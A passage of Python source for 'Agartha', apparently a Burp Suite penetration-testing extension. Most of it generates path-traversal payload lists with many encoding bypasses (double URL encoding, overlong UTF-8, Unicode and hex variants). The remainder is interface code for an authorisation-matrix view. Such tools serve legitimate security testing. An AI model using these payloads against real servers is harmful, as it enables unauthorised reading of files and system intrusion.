                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%252f")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%252e%252e")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%252e%252e%252f")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%252e%252e").replace("/", "%252f")+"\n")

                listem.append((_resultTxt).replace("/", "%u2215")+ self._txtDictParam.text +"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%u2215")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%uff0e%uff0e")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%uff0e%uff0e%u2215")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%uff0e%uff0e").replace("/", "%u2215")+"\n")

                listem.append((_resultTxt).replace("/", "%c0%af")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%c0%af")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%c0%ae%c0%ae%c0%af")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae").replace("/", "%c0%af")+"\n")
                
                listem.append((_resultTxt).replace("/", "%25c0%25af")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%25c0%25af")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%25c0%25ae%25c0%25ae%25c0%25af")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae").replace("/", "%25c0%25af")+"\n")

                listem.append((_resultTxt).replace("/", "%c1%9c")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%c1%9c")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%c0%ae%c0%ae%c1%9c")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae").replace("/", "%c1%9c")+"\n")

                listem.append((_resultTxt).replace("/", "%25c1%259c")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%25c1%259c")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%25c0%25ae%25c0%25ae%25c1%259c")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae").replace("/", "%25c1%259c")+"\n")

                listem.append((_resultTxt).replace("/", "%%32%66")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%%32%66")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%%32%65%%32%65")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%%32%65%%32%65%%32%66")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%%32%65%%32%65").replace("/", "%%32%66")+"\n")

                listem.append((_resultTxt).replace("/", "%%35%63")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%%35%63")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%%32%65%%32%65")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%%32%65%%32%65%%35%63")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%%32%65%%32%65").replace("/", "%%35%63")+"\n")

                listem.append((_resultTxt).replace("/", "%u2216")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%u2216")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%uff0e%uff0e")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%uff0e%uff0e%u2216")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%uff0e%uff0e").replace("/", "%u2216")+"\n")

                listem.append((_resultTxt).replace("/", "0x2f")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "0x2f")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "0x2e0x2e")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "0x2e0x2e0x2f")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "0x2e0x2e").replace("/", "0x2f")+"\n")

                listem.append((_resultTxt).replace("/", "%c0%2f")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%c0%2f")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%c0%2e%c0%2e%c0%2f")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e").replace("/", "%c0%2f")+"\n")

                listem.append((_resultTxt).replace("/", "%c0%5c")+ self._txtDictParam.text+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("/", "%c0%5c")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("../", "%c0%2e%c0%2e%c0%5c")+"\n")
                listem.append((_resultTxt + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e").replace("/", "%c0%5c")+"\n")
                
                listem.append((_resultTxt2 + self._txtDictParam.text)+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text)+"\n")
                listem.append(((_resultTxt2)[:-1] + "//" + self._txtDictParam.text)+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("\\", "\\\\")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" +  self._txtDictParam.text).replace("\\", "\\\\")+"\n")
                listem.append(((_resultTxt2)[:-1]).replace("\\", "\\\\") + "/" +  self._txtDictParam.text +"\n")
                listem.append((_resultTxt2).replace("\\", "\\\\") + self._txtDictParam.text +"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "...")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "...")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "....")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "....\\\\")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "....")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..\\", "....\\\\")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("\\", "%255c")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("\\", "%255c")+"\n")
                listem.append((_resultTxt2).replace("\\", "%255c") + self._txtDictParam.text +"\n")
                listem.append(((_resultTxt2)[:-1]).replace("\\", "%255c") + "/" + self._txtDictParam.text +"\n")
                listem.append(((_resultTxt2)[:-1]).replace("\\", "%255c") + "\\" + self._txtDictParam.text +"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("\\", "%5c")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("\\", "%5c")+"\n")
                listem.append(((_resultTxt2)[:-1]).replace("\\", "%5c") + "/" + self._txtDictParam.text + "\n")
                listem.append(((_resultTxt2)[:-1]).replace("\\", "%5c") + "\\" + self._txtDictParam.text + "\n")
                listem.append((_resultTxt2).replace("\\", "%5c") + self._txtDictParam.text + "\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("\\", "0x5c")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("\\", "0x5c")+"\n")
                listem.append((_resultTxt2).replace("\\", "0x5c")+ self._txtDictParam.text + "\n")
                listem.append(((_resultTxt2)[:-1]).replace("\\", "0x5c") + "/" + self._txtDictParam.text + "\n")
                listem.append(((_resultTxt2)[:-1]).replace("\\", "0x5c") + "\\" + self._txtDictParam.text + "\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%2e%2e")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%2e%2e")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "0x2e0x2e")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "0x2e0x2e")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%252e%252e")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%252e%252e")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%c0%ae%c0%ae")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%25c0%25ae%25c0%25ae")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%uff0e%uff0e")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%uff0e%uff0e")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%c0%2e%c0%2e")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "%2e%2e%5c")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%2e%2e").replace("\\", "%5c")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "%252e%252e%255c")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "%252e%252e").replace("\\", "%255c")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "0x2e0x2e0x5c")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..", "0x2e0x2e").replace("\\", "0x5c")+"\n")
                listem.append((_resultTxt2 + self._txtDictParam.text).replace("..\\", "..\\/")+"\n")
                listem.append(((_resultTxt2)[:-1] + "/" + self._txtDictParam.text).replace("..\\", "..\\/")+"\n")
                
            counter = counter + 1

        listem = list(set(listem))
        listem.sort(reverse=True)
        self._tabDictResultDisplay.setText(''.join(map(str, listem)))
        self._lblStatusLabel.setText('File dictionary: "' + self._txtDictParam.text + '", with '+ str(len(listem)) + ' result.')
        
        return

    def getTabCaption(self):
        return "Agartha"
    def getUiComponent(self):
        return self._MainTabs
    def getHttpService(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getHttpService()
    def getRequest(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getRequest()
    def getResponse(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getResponse()    
    def createMenuItems(self, invocation):
        self.context = invocation
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Send to Agartha", actionPerformed=self.agartha_menu))
        return menu_list
    def agartha_menu(self,event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        #_req = StringUtil.fromBytes(http_contexts[0].getRequest())
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = ""
        for http_context in http_contexts:
            _url += str(self._helpers.analyzeRequest(http_context).getUrl()) + "\n"
        self._tbAuthHeader.setText(_req)
        self._tbAuthURL.setText(_url)
        self._MainTabs.setSelectedComponent(self._tabAuthSplitpane)
        self._MainTabs.getParent().setSelectedComponent(self._MainTabs)
    def authMatrix(self, ev):
        t= Thread(target=self.authMatrixThread,args=[self])
        t.start()
        return
    def _updateReqResView(self, ev):
        try:
            row = self.tableMatrix.getSelectedRow()
            userID = self.tableMatrix.getSelectedColumn()
            if userID==0:
                self._requestViewer.setMessage("", True)
                self._responseViewer.setMessage("", True)
            else:
                self._requestViewer.setMessage(self.httpReqRes[userID-1][row].getRequest(), True)
                self._responseViewer.setMessage(self.httpReqRes[userID-1][row].getResponse(), True)
        except:
            self._requestViewer.setMessage("", True)
            self._responseViewer.setMessage("", True)
    def isURLValid(self, urlAdd):
        if urlAdd.startswith("http"):
            return True
        else:
            #white space exception
            if urlAdd:
                return False
                self._lblAuthNotification.text = "Please Check URL list"
            else:
                return True


class UserEnabledRenderer(TableCellRenderer):
    def __init__(self, defaultCellRender, userNamesHttpUrls):
        self._defaultCellRender = defaultCellRender
        self.urlList= userNamesHttpUrls
        self.colorsUser = [Color(204, 229, 255), Color(204, 255, 204), Color(204, 204, 255), Color(234,157,197)]
        self.colorsAlert = [Color.white, Color(255, 153, 153), Color(255,218,185), Color(255, 255, 204), Color(211,211,211)]

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        cell = self._defaultCellRender.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column)

        cell.setBackground(self.colorsAlert[0])
        try:
            if column == 0:
                #URL section - default whitee
                cell.setBackground(self.colorsAlert[0])
            elif table.getValueAt(row, column) and not table.getValueAt(row, column).startswith("HTTP 2") and not table.getValueAt(row, column).startswith("HTTP 3"):
                #error or http 4XX/5XX
                cell.setBackground(self.colorsAlert[4])
            elif column == 1:
                #no auth
                cell.setBackground(self.colorsAlert[0])
                if _colorful:
                    for y in range(2,table.getColumnCount()):
                        if table.getValueAt(row, y) == table.getValueAt(row, column):
                            if table.getValueAt(row, y).startswith("HTTP 2"):
                                cell.setBackground(self.colorsAlert[1])
                            elif table.getValueAt(row, y).startswith("HTTP 3"):
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[3])
                        elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[2])
            elif table.getValueAt(row, 0) in self.urlList[column- 1]:
                cell.setBackground(self.colorsUser[column-2])
            else:    
                #other users
                cell.setBackground(self.colorsAlert[0])
                if _colorful:
                    for y in range(2,table.getColumnCount()):
                        if table.getValueAt(row, y) == table.getValueAt(row, column):
                            if table.getValueAt(row, y).startswith("HTTP 2"):
                                cell.setBackground(self.colorsAlert[1])
                            elif table.getValueAt(row, y).startswith("HTTP 3"):
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[3])
                        elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                            if not cell.getBackground() == self.colorsAlert[1]:    
                                cell.setBackground(self.colorsAlert[2])
        except:
            cell.setBackground(self.colorsAlert[0])

        if isSelected:
            cell.setBackground(Color(240,230,140))
            cell.setFont(cell.getFont().deriveFont(Font.BOLD));
        if hasFocus:
            cell.setBackground(Color(238,232,170))
        
        return cell

class CustomDefaultTableModel(DefaultTableModel):
    def __init__(self, data, headings) :
        DefaultTableModel.__init__(self, data, headings)

    def isCellEditable(self, row, col) :
        return col == 0